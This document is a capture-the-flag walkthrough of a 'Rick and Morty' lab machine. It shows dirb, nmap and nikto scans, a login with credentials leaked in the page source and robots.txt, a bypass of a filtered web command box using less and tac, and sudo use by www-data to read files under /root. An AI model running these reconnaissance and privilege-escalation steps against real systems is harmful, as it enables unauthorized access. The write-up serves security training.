# Rick and Morty

## Step 1: Inspect the Web Page

- Page source contains a username:

```text
R1ckRul3s
```

## Step 2: Enumerate Web Content

```bash
dirb http://10.10.6.199 /usr/share/wordlists/dirb/common.txt
```

- `robots.txt` reveals:

```text
Wubbalubbadubdub
```

## Step 3: Nmap

### Basic Scan

```bash
nmap 10.10.6.199
```

### Open Ports

- `22/tcp` - SSH
- `80/tcp` - HTTP

### Service Scan

```bash
nmap -A -Pn -T4 -p22,80 10.10.6.199
```

### Findings

- SSH:
  - `OpenSSH 7.2p2 Ubuntu`
- HTTP:
  - `Apache/2.4.18 Ubuntu`

## Step 4: Nikto

```bash
nikto -host 10.10.6.199 -port 80
```

### Findings

- Server leaks inodes through ETags.
- `robots.txt` does not contain `Disallow` entries, which is unusual.
- Allowed methods:
  - `GET`
  - `HEAD`
  - `POST`
  - `OPTIONS`
- `PHPSESSID` cookie is created without the `HttpOnly` flag.
- Admin login page found:
  - `/login.php`

## Step 5: Login

- Login page:

```text
http://10.10.6.199/login.php
```

- Username:

```text
R1ckRul3s
```

- Password from `robots.txt`:

```text
Wubbalubbadubdub
```

- Login works and reveals a page with a command input box.

## Step 6: Command Input Box

### Initial Enumeration

- Run:

```bash
ls
```

- File discovered:

```text
Sup3rS3cretPickl3Ingred.txt
```

### First Ingredient

- `cat` is disabled.
- Try alternatives to `cat`, such as `less` or `tac`.
- `less` reveals:

```text
mr. meeseeks hair
```

### Command Filtering

- Using `tac` against `portal.php` shows that several commands are prohibited.
- `sudo` is not on the prohibited list.

### Sudo Discovery

```bash
sudo -l
```

- Most commands appear to be permitted.

### User Context

```bash
whoami
```

- User is the web user:

```text
www-data
```

## Second Ingredient

- Enumerate home directories:

```bash
ls ../../../home/
ls -alh ../../../home/
ls -alh ../../../home/rick/
```

- File discovered:

```text
second ingredients
```

- Because the filename contains a space, quote the path when using `tac`.
- Second ingredient:

```text
1 jerry tear
```

## Third Ingredient

- Use sudo to inspect root:

```bash
sudo ls -alh ../../../root
```

- File discovered:

```text
3rd.txt
```

- Read it with `tac`:

```bash
sudo tac ../../../root/3rd.txt
```

- Third ingredient:

```text
fleeb juice
```
